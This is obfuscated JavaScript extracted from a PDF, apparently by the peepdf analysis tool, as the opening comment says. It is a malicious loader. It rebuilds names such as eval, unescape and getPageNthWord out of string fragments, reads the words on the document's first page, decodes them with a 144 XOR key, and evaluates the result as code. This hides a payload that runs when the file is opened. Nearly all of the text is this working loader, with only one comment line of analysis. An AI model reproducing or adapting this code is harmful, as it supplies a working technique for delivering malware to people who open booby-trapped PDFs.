// peepdf comment: Javascript code located in object 10 (version 0)

  var sdfjhSend = ["ev", "", "al"];
  sdrt = new String(sdfjhSend[0] + sdfjhSend[2] + sdfjhSend[1]);
  var foxit = ["p", "a", "p", ""];
  v = new String(foxit[1] + foxit[0] + foxit[0] + foxit[3]);
  var sdftuf = 144;
  var google = "";
  var send = String;
  var check = 1;
  var sdftufDs = "ge" + "tP9OHV".substr(0, 2) + "x4fag".substr(3) + "WKceN".substr(3) + "umaS1T".substr(0, 2) + "9OaWo".substr(3) + "rd" + "vets".substr(3);
  var sdfjhSdftuf = "unesBzMi".substr(0, 4) + "cape";
  var sdsdf = "E8Kfrom".substr(3) + "Char" + "GrBCodeBrG".substr(3, 4);

  function unlock(b, fsdf) {
      return b ^ fsdf;
  }
  var bC = "BMZchar".substr(3) + "rSKCode".substr(3) + "yV5At".substr(3);
  var aCheck = String("getP" + "QLhageN".substr(3) + "xkwthWowkx".substr(3, 4) + "ZumrduZm".substr(3, 2));
  var unlockDsjkg = String("%");
  var mailUnlock = 0;
  var googleArray = String("subs" + "trIHNR".substr(0, 2));
  var readerB = 3 - 1;
  var window = this;
  var v = window[v];
  var adobe = window[sdftufDs](check);
  var windowA = window[sdrt];
  var editFsdf = window[sdfjhSdftuf];
  for (var googleArrayFoxit = mailUnlock; googleArrayFoxit < adobe; googleArrayFoxit++) {
      sdsdfSdfjh = window[aCheck](check, googleArrayFoxit);
      var dsB = sdsdfSdfjh[googleArray](sdsdfSdfjh.length - readerB, readerB);
      var unlockDsjkgSdrt = unlockDsjkg + dsB;
      var d = editFsdf(unlockDsjkgSdrt);
      var sdsdfSdfjhD = d[bC](mailUnlock);
      var sdrtEdit = unlock(sdsdfSdfjhD, sdftuf);
      google += send[sdsdf](sdrtEdit);
  }
  windowA(google);

